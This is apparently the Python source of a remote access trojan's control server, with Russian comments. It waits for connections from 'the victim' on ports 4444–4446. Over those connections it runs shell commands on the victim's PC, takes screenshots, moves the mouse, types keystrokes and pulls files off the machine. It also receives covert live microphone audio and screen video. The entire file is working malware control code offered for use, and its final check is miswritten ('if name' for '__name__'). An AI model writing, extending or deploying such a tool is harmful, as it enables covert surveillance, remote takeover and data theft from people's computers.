import socket
import threading
import mss
import numpy as np
from PIL import Image
import io
import pyaudio
import wave
import time

# === НАСТРОЙКИ ===
COMMAND_PORT = 4444
AUDIO_PORT = 4445
SCREEN_PORT = 4446
LOCAL_IP = "0.0.0.0"  # слушаем все интерфейсы

clients = {}

def handle_commands(conn, addr):
    print(f"[+] Подключен командный канал от {addr}")
    while True:
        cmd = input("Введите команду (help для списка): ")
        if cmd.lower() == "help":
            print("""
            shell <команда>  - выполнить команду на ПК жертвы
            screenshot       - получить скриншот
            mouse_move X Y   - переместить мышь
            mouse_click      - клик левой кнопкой
            key <текст>      - напечатать текст
            download <файл>  - скачать файл с ПК жертвы
            exit             - отключиться
            """)
        elif cmd.lower().startswith("shell "):
            conn.send(cmd.encode())
            data = conn.recv(65535)
            print(data.decode())
        elif cmd.lower() == "screenshot":
            conn.send(b"screenshot")
            # получим изображение
            img_data = b""
            while True:
                chunk = conn.recv(65535)
                img_data += chunk
                if b"---ENDOFIMAGE---" in chunk:
                    break
            with open("screen.jpg", "wb") as f:
                f.write(img_data.replace(b"---ENDOFIMAGE---", b""))
            print("[+] Скриншот сохранён как screen.jpg")
        elif cmd.lower().startswith("mouse_move"):
            conn.send(cmd.encode())
        elif cmd.lower().startswith("mouse_click"):
            conn.send(cmd.encode())
        elif cmd.lower().startswith("key "):
            conn.send(cmd.encode())
        elif cmd.lower().startswith("download "):
            conn.send(cmd.encode())
            data = conn.recv(10485760)
            filename = cmd.split()[1]
            with open(f"downloaded_{filename}", "wb") as f:
                f.write(data)
            print(f"[+] Файл сохранён как downloaded_{filename}")
        elif cmd.lower() == "exit":
            conn.send(b"exit")
            break

def handle_audio(conn, addr):
    print(f"[+] Аудиопоток от {addr}")
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, output=True, frames_per_buffer=CHUNK)
    while True:
        try:
            data = conn.recv(CHUNK)
            if not data: break
            stream.write(data)
        except:
            break
    stream.stop_stream()
    stream.close()
    p.terminate()

def handle_screen(conn, addr):
    print(f"[+] Видеопоток от {addr}")
    while True:
        try:
            data = conn.recv(65535)
            if not data: break
            # сохраняем кадр как временный файл
            with open("live_frame.jpg", "wb") as f:
                f.write(data)
        except:
            break

def start_server():
    # Командный сервер
    cmd_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cmd_server.bind((LOCAL_IP, COMMAND_PORT))
    cmd_server.listen(1)
    print(f"[*] Ожидание подключения жертвы на порту {COMMAND_PORT}...")
    conn, addr = cmd_server.accept()
    clients['cmd'] = conn
    threading.Thread(target=handle_commands, args=(conn, addr), daemon=True).start()
    
    # Аудио сервер
    audio_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    audio_server.bind((LOCAL_IP, AUDIO_PORT))
    audio_server.listen(1)
    aconn, aaddr = audio_server.accept()
    threading.Thread(target=handle_audio, args=(aconn, aaddr), daemon=True).start()
    
    # Видео сервер
    video_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    video_server.bind((LOCAL_IP, SCREEN_PORT))
    video_server.listen(1)
    vconn, vaddr = video_server.accept()
    threading.Thread(target=handle_screen, args=(vconn, vaddr), daemon=True).start()
    
    print("[+] Все каналы запущены. Вводите команды в командной строке.")
    while True:
        time.sleep(1)

if name == "__main__":
    start_server()